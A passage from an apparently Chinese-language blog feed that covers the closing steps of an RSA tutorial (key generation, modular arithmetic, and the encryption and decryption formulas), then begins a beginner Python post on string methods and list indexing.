<p>第五步，计算 <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="16.206ex" height="2.565ex" role="img" focusable="false" viewbox="0 -883.9 7163.2 1133.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mo" transform="translate(797.8,0)"><path data-c="2261" d="M56 444Q56 457 70 464H707Q722 456 722 444Q722 430 706 424H72Q56 429 56 444ZM56 237T56 250T70 270H707Q722 262 722 250T707 230H70Q56 237 56 250ZM56 56Q56 71 72 76H706Q722 70 722 56Q722 44 707 36H70Q56 43 56 56Z"/></g><g data-mml-node="msup" transform="translate(1853.6,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g><g data-mml-node="TeXAtom" transform="translate(499,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g><g data-mml-node="mi" transform="translate(3306.2,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(4184.2,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/></g><g data-mml-node="mi" transform="translate(4669.2,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mi" transform="translate(5189.2,0)"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 -205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"/></g><g data-mml-node="mo" transform="translate(5785.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(6174.2,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(6774.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container> <strong>【e d ≡ 1 mod ɸ ( 𝓷 ) = K * ɸ ( 𝓷 ) + 1 (K ∈ N^*^)】</strong> </p>
<p>第六步，保密 d 、 p 和 q, 而公开 n 和 e, 即 d 作为私钥，而 n 和 e 作为公钥。</p>

  <div class="note-large purple">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>模运算</p>

    </div>
    <div class="notel-content">
      <blockquote>
<p>设 n 是一个正整数，a 是整数，如果用 n 除以 a ,得商为 q ,余数为 r ,则：<br>a = q * n + r, 0 &lt;= r &lt; n, q =  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.577ex;" xmlns="http://www.w3.org/2000/svg" width="4.362ex" height="4.104ex" role="img" focusable="false" viewbox="0 -1117 1928 1814"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="230A" d="M174 734Q174 735 175 737T177 740T180 744T184 747T189 749T196 750Q206 748 214 735V-210H310H373Q401 -210 411 -213T422 -230T411 -247T369 -251Q362 -251 338 -251T298 -250H190Q178 -246 174 -234V734Z"/></g><g data-mml-node="mfrac" transform="translate(444,0)"><g data-mml-node="mi" transform="translate(255.5,676)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mi" transform="translate(220,-686)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><rect width="800" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(1484,0)"><path data-c="230B" d="M229 734Q229 735 230 737T232 740T235 744T239 747T244 749T251 750Q262 748 269 735V-235Q266 -240 256 -249L147 -250H77Q43 -250 32 -247T21 -230T32 -213T72 -209Q79 -209 99 -209T133 -210H229V734Z"/></g></g></g></svg></mjx-container><br>余数 r 用 a mod n 表示。<br>若(a mod n) = (b mod n)，则称两个整数 a 和 b 模 n 同余，记为 a ≡ b mod n 。</p>
</blockquote>

    </div>
  </div>
</blockquote>
<blockquote>
<p>例题：</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/RSA%E7%AE%97%E6%B3%95%E9%A2%981.png" alt="RSA算法题1"></p>
<p>e * d ≡ 1 mod ɸ ( 𝓷 )</p>
<p>1 / ɸ ( 𝓷 ) = 0 …… 1</p>
<p>1 mod ɸ ( 𝓷 ) = 1</p>
</blockquote>
<h2 id="二-加解密算法解析"><a href="#二-加解密算法解析" class="headerlink" title="(二)加解密算法解析"></a>(二)加解密算法解析</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>​		加密时首先将明文比特串分组，使得每个分组对应的十进制数小于 n ，即分组长度小于   log<del>2</del>n  。然后对每个明文分组   ，作加密运算：</p>
<blockquote>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="14.919ex" height="1.691ex" role="img" focusable="false" viewbox="0 -725.5 6594.1 747.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"/></g><g data-mml-node="mo" transform="translate(1037.8,0)"><path data-c="2261" d="M56 444Q56 457 70 464H707Q722 456 722 444Q722 430 706 424H72Q56 429 56 444ZM56 237T56 250T70 270H707Q722 262 722 250T707 230H70Q56 237 56 250ZM56 56Q56 71 72 76H706Q722 70 722 56Q722 44 707 36H70Q56 43 56 56Z"/></g><g data-mml-node="msup" transform="translate(2093.6,0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"/></g><g data-mml-node="mi" transform="translate(1138,413) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g></g><g data-mml-node="mtext" transform="translate(3611.1,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(3861.1,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(4739.1,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/></g><g data-mml-node="mi" transform="translate(5224.1,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mtext" transform="translate(5744.1,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(5994.1,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container></p>
</blockquote>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><blockquote>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="15.001ex" height="2.094ex" role="img" focusable="false" viewbox="0 -903.7 6630.5 925.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"/></g><g data-mml-node="mo" transform="translate(1328.8,0)"><path data-c="2261" d="M56 444Q56 457 70 464H707Q722 456 722 444Q722 430 706 424H72Q56 429 56 444ZM56 237T56 250T70 270H707Q722 262 722 250T707 230H70Q56 237 56 250ZM56 56Q56 71 72 76H706Q722 70 722 56Q722 44 707 36H70Q56 43 56 56Z"/></g><g data-mml-node="msup" transform="translate(2384.6,0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"/></g><g data-mml-node="mi" transform="translate(845.3,413) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g></g><g data-mml-node="mtext" transform="translate(3647.5,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(3897.5,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(4775.5,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/></g><g data-mml-node="mi" transform="translate(5260.5,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mtext" transform="translate(5780.5,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(6030.5,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container></p>
</blockquote>
<blockquote>
<p>例题：</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/RSA%E7%AE%97%E6%B3%95%E9%A2%982.png" alt="RSA算法题2"></p>
</blockquote>
]]></content>
      <categories>
        <category>密码体制</category>
      </categories>
      <tags>
        <tag>密码体制</tag>
        <tag>密码学</tag>
        <tag>RSA</tag>
        <tag>非对称密码体制[公钥密码体制]</tag>
      </tags>
  </entry>
  <entry>
    <title>Python从入门到实践</title>
    <url>/2024/01/21/Python%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="概念定义"><a href="#概念定义" class="headerlink" title="概念定义"></a>概念定义</h3><blockquote>
<p>字符串是一系列字符</p>
</blockquote>
<h3 id="使用字符串"><a href="#使用字符串" class="headerlink" title="使用字符串"></a>使用字符串</h3><blockquote>
<ol>
<li>字符串元素的大小写</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">&quot;Ada Lovelace&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(name.title())<span class="comment">#首字母大写</span></span><br><span class="line"><span class="built_in">print</span>(name.upper())<span class="comment">#所有字母大写</span></span><br><span class="line"><span class="built_in">print</span>(name.lower())<span class="comment">#所有字母小写</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ada Lovelace</span><br><span class="line">Ada Lovelace</span><br><span class="line">ADA LOVELACE</span><br><span class="line">ada lovelace</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>删除字符串空白</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;language=<span class="string">&#x27; python </span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language</span></span><br><span class="line"><span class="string">&#x27;</span> python <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language.lstrip()#删除左端空白</span></span><br><span class="line"><span class="string">&#x27;</span>python <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language.rstrip()#删除右端空白</span></span><br><span class="line"><span class="string">&#x27;</span> python<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;language.strip()#删除左右两端空白</span></span><br><span class="line"><span class="string">&#x27;</span>python<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>删除前缀</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;nostarch_url=<span class="string">&quot;https://nostarch.com&quot;</span></span><br><span class="line">&gt;&gt;&gt;nostarch_url.removeprefix(<span class="string">&#x27;https://&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;nostarch.com&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="概念定义-1"><a href="#概念定义-1" class="headerlink" title="概念定义"></a>概念定义</h3><blockquote>
<p>列表(list)是由一系列按照特定顺序排列的元素组成</p>
</blockquote>
<h3 id="访问列表元素"><a href="#访问列表元素" class="headerlink" title="访问列表元素"></a>访问列表元素</h3><blockquote>
<ol>
<li>利用元素的索引来访问元素值</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bicycles=[<span class="string">&#x27;trek&#x27;</span>,<span class="string">&#x27;cannondale&#x27;</span>,<span class="string">&#x27;redline&#x27;</span>,<span class="string">&#x27;specialized&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(bicycles[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(bicycles[<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(bicycles[-<span class="number">1</span>])</span><br><span class="line">messages=<span class="string">f&quot;My first bicycle was a <span class="subst">&#123;bicycles[<span class="number">0</span>].title()&#125;</span>&quot;</span><span class="string">&#x27;&#x27;&#x27;在字符串中插入变量的值，使用f字符串，f为format的简写，Python通过把花括号的变量替换成变量的值来设置字符串的格式&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(messages)</span><br><span class="line"><span class="comment">#列表元素的索引是从0开始</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;列表元素索引为3的元素为specialized,而不是redline&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;索引-1表示列表的最后一个元素&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#bicycles[0]为对象；title()为方法即函数；</span></span><br><span class="line"><span class="comment">#bicycles[0].title()为对象调用title()方法的形式</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">trek</span><br><span class="line">specialized</span><br><span class="line">specialized</span><br><span class="line">My first bicyvle was a Trek</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>修改列表元素</li>
</ol>
